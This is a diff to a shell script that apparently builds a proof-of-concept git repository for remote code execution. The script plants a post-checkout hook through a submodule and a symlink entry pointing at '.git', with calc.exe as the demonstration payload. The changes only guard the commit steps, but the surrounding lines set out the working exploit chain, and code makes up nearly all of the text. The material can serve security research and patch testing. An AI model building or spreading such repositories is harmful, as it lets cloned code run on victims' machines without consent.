@@ -42,7 +42,7 @@ touch .git/info/exclude
 grep -qxF 'Call-Post-Checkout.sh' .git/info/exclude||echo 'Call-Post-Checkout.sh' >>.git/info/exclude
 echo 'It works!' >Test.txt
 git add Test.txt
-git commit -m "test"
+git diff --cached --quiet ||git commit -m "test"
 CMD <<END
 start explorer "C:\Windows\System32\calc.exe"
 echo.It works!
@@ -59,7 +59,7 @@ git_editor="VIM"
 fi
 "$git_editor" "$PWD/scripts/hooks/post-checkout"
 git add scripts/hooks/post-checkout ||error_handler
-git commit -m "add-post-checkout" ||error_handler
+git diff --cached --quiet ||git commit -m "add-post-checkout" ||error_handler
 git stash ||error_handler
 cd ..
 hook_repo_path="$PWD/git_rce_hook"
@@ -76,9 +76,9 @@ git config receive.denyDeletes false
 git submodule add --name RCE/scripts "$hook_repo_path" GITLNK/modules/RCE ||error_handler
 git config -f .gitmodules submodule.RCE/scripts.ignore all ||error_handler
 git add .gitmodules ||error_handler
-git commit -m "add-submodule" ||error_handler
+git diff --cached --quiet ||git commit -m "add-submodule" ||error_handler
 git update-index --add --cacheinfo 120000 $(echo -n ".git" | git hash-object -w --stdin) gitlnk ||error_handler
-git commit -m "add-symlink" ||error_handler
+git diff --cached --quiet ||git commit -m "add-symlink" ||error_handler
 xcopy GITLNK .git //b //e //v //r //i //g //h //o //c //k //y ||error_handler
 git reset --hard HEAD ||error_handler
 git stash ||error_handler
